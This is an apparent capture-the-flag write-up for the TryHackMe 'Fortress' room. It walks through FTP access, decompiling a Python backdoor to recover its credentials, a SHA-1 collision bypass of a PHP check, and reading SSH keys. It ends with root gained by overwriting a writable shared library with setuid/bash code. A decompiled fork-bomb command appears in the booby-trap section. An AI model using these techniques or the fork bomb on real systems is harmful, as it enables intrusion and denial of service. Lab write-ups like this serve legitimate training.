# Fortress

https://tryhackme.com/room/fortress

Reasonably complex room, with some techniques I haven't used for a while. Reasonably fun!

## Initial Enum & Python Decompiling

A scan revealed:

```
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
5581/tcp open  ftp     syn-ack vsftpd 3.0.3
5752/tcp open  unknown syn-ack
7331/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
```

By accessing 5752 with `nc <ip> 5752` it presented a console based login form, but I didn't have creds.

Accessing the ftp site with `ftp <ip> 5581` I was able to auth with anonymous access. Inside was a text file `marked.txt`:

```
If youre reading this, then know you too have been marked by the overlords... Help memkdir /home/veekay/ftp I have been stuck inside this prison for days no light, no escape... Just darkness... Find the backdoor and retrieve the key to the map... Arghhh, theyre coming... HELLLPPPPPmkdir /home/veekay/ftp
```

`ls -la` revealed an additional file, `.file`, which when I read it was in binary. However some strings indicated this might be the running executable behind the 5752 service. `file .file` revealed: `.file: python 2.7 byte-compiled`.

To read the source I used https://github.com/BlueEffie/uncompyle2. It required the use of `python2 setup.py install` to setup, but then I could read the source of .file with `uncompyle2 .file`:

```
# 2021.09.05 02:49:11 BST
#Embedded file name: ../backdoor/backdoor.py
import socket
import subprocess
from Crypto.Util.number import bytes_to_long
usern = 232340432076717036154994L
passw = 10555160959732308261529999676324629831532648692669445488L
port = 5752
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', port))
s.listen(10)

def secret():
    with open('secret.txt', 'r') as f:
        reveal = f.read()
        return reveal


while True:
    try:
        conn, addr = s.accept()
        conn.send('\n\tChapter 1: A Call for help\n\n')
        conn.send('Username: ')
        username = conn.recv(1024).decode('utf-8').strip()
        username = bytes(username, 'utf-8')
        conn.send('Password: ')
        password = conn.recv(1024).decode('utf-8').strip()
        password = bytes(password, 'utf-8')
        if bytes_to_long(username) == usern and bytes_to_long(password) == passw:
            directory = bytes(secret(), 'utf-8')
            conn.send(directory)
            conn.close()
        else:
            conn.send('Errr... Authentication failed\n\n')
            conn.close()
    except:
        continue
+++ okay decompyling .file
# decompiled 1 files: 1 okay, 0 failed, 0 verify failed
# 2021.09.05 02:49:11 BST
```

To reveal the username and password I used `python2 -c "from Crypto.Util.number import long_to_bytes; print(long_to_bytes(232340432076717036154994L))"` and `python2 -c "from Crypto.Util.number import long_to_bytes; print(long_to_bytes(10555160959732308261529999676324629831532648692669445488L))"`.

I used the discovered creds on the 5752 service and was reward with a special string (presumably from secret.txt), though I was not sure of its use yet.

## Web enum and SHA1 collisions

Examing the source, the name of the variable the special string is stored in is 'directory', so I tried using it on the otherwise blank (Apache default pages) on the webport, but this failed. However, if I used it as a filename with the php extension (e.g. http://fortress:7331/<string>.php) I got access to the chapter 2 site, which contained the following source:
    
```html

<html>
<head>
	<title>Chapter 2</title>
	<link rel='stylesheet' href='assets/style.css' type='text/css'>
</head>
<body>
	<div id="container">
        <video width=100% height=100% autoplay>
            <source src="./assets/flag_hint.mp4" type=video/mp4>
        </video>


<!-- Hmm are we there yet?? May be we just need to connect the dots -->

<!--    <center>
			<form id="login" method="GET">
				<input type="text" required name="user" placeholder="Username"/><br/>
				<input type="text" required name="pass" placeholder="Password" /><br/>
				<input type="submit"/>
			</form>
		</center>
-->

    </div>

</body>
</html>    
```
    
The mp4 file was a rick roll. In assets/style.css however was a base64 string that contained:
    
```This is journey of the great monks, making this fortress a sacred world, defending the very own of their kinds, from what it is to be unleashed... The only one who could solve their riddle will be granted a KEY to enter the fortress world. Retrieve the key by COLLIDING those guards against each other.```
    
Additional enumeration revealed a second page, as above but with the html extension (e.g. http://fortress:7331/<string>.html). This appeared to contain source code for the PHP check:
	
```html

<html>
<head>
	<title>Chapter 2</title>
	<link rel='stylesheet' href='assets/style.css' type='text/css'>
</head>
<body>
	<div id="container">
        <center><h1>
        	The Temple of Sins
        </h1></center>

        <center>
            <img src="./assets/guardians.png" width="700px" height="400px">
        </center>


<!--
<?php
require 'private.php';
$badchar = '000000';
if (isset($_GET['user']) and isset($_GET['pass'])) {
    $test1 = (string)$_GET['user'];
    $test2 = (string)$_GET['pass'];

    $hex1 = bin2hex($test1);
    $hex2 = bin2hex($test2);
    

    if ($test1 == $test2) {
        print 'You can't cross the gates of the temple, GO AWAY!!.';
    } 
    
    else if(strlen($test2) <= 500 and strlen($test1) <= 600){
    	print "<pre>Nah, babe that ain't gonna work</pre>";
    }

    else if( strpos( $hex1, $badchar ) or strpos( $hex2, $badchar )){
    	print '<pre>I feel pitty for you</pre>';
    }
    
    else if (sha1($test1) === sha1($test2)) {
      print "<pre>'Private Spot: '$spot</pre>";
    } 
    
    else {
        print '<center>Invalid password.</center>';
    }
}
?>
-->

<!-- Don't believe what you see... This is not the actual door to the temple. -->
	    <center>
			<form id="login" method="GET">
				<input type="text" required name="user" placeholder="Username"/><br/>
				<input type="text" required name="pass" placeholder="Password" /><br/>
				<input type="submit"/>
			</form>
		</center>

    </div>

</body>
</html>
```
	
To bypass the above, the only way I could see was to use a legitimate sha1 collision, and one small enough to fit on these query strings. The use of `===` meant type juggling wasnt going to work, and the `(string)` explicit casting meant no null tricks or array what have you's would work either.
	
Ultimately I used the two files from https://sha-mbles.github.io/, messageA and messageB; both were 640 bytes, which means with PHP's `urlencode` they could fit on the query string. This worked and revealed the name of a hidden file, in the form `http://fortress:7331/<hidden filename>.txt`. Inside the file was the private key for a user named **h4rdy**.
	
## SSH Shenanigans & User flag
	
I was able to ssh in with this key, but ended up in a restricted, rbash shell. By exiting and reconnecting using `ssh -i h4rdy.key h4rdy@<ip> bash` I had a more functional shell.
	
`sudo -l` revealed h4rdy could run `cat` as the user `j4x0n`. This allowed me to read the latter users private ssh key, so I could then ssh in as j4x0n without any restrictions. j4x0n's home folder contained the **user.txt** flag.
	
## Root boobytrap and DLL hijacking
	
Aside from the flag, j4x0n's folder contained the following in endgame.txt:
	
`Bwahahaha, you're late my boi!! I have already patched everything... There's nothing you can exploit to gain root... Accept your defeat once and for all, and I shall let you leave alive.`
	
A quick enum of the machine found a suid binary named 'bt' under /opt. Running this would present the output:
	
```
Root Shell Initialized...
Exploiting kernel at super illuminal speeds...
Getting Root...
Bwahaha, You just stepped into a booby trap XP
```
	
Before random nonsense would fill the screen (and break my shell).
	
I pulled down bt and examined it using ghidra, to see it did nothing after print the top three lines and then invoke 'foo()', an external function.
	
`ldd bt` revealed it depended on `/usr/lib/libfoo.so`, which when decompiled revealed:
	
```c
void foo(void)
{
  puts("Bwahaha, You just stepped into a booby trap XP");
  sleep(2);
  system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
  system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
  system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
  system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
  system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
  return;
}
```
	
Dangerous. I tried various path injections (e.g. creating an executable file named `sleep` containing `/bin/sh` and then `export PATH=/tmp:$PATH`) but this never seemed to work.
	
However, further enum revealed libfoo.so was writable by j4x0n. So I did the following:
	
1. Created a c file with the following contents (base content taken from https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld_preload):
	
	```c
	#include <stdio.h>
	#include <sys/types.h>
	#include <stdlib.h>

	void foo() {
	    setgid(0);
	    setuid(0);
	    system("/bin/bash");
	}
	```

2. Compiled this using `gcc -fPIC -shared -o pe.so pe.c -nostartfiles`
3. Backed up the existing libfoo (just in case)
4. Copied pe.so over libfoo.so
	
When I then ran bt, after passing the initial text, I ended in a root shell and got the root flag :)
	
Aside from the flag, this note was in the root folder:
	
```
Well done!! If you did this box without any help... Without any hints... You did a REAL GREAT JOB!! In that case, I am definitely sure that you have learnt a few things from this small challenge box. As this was the end of Chapter 3: Showdown... The story of fortress conquered by j4x0n and his alliance came to an end.


And if you were interested in what happened to j4x0n (aka me) after you took control over the fortress. Tbh, he went insanely furious for this loss... The politics he played, the kingdom he built so far came to a tremendous end. Feeling the hatred, the sorrow he escaped into a dense forest before someone could notice. Not sure, if he is gonna survive the wildery of those jungles... But if he does... Well, m4y th3 l0r6 s4v3 u5 4ll.
```

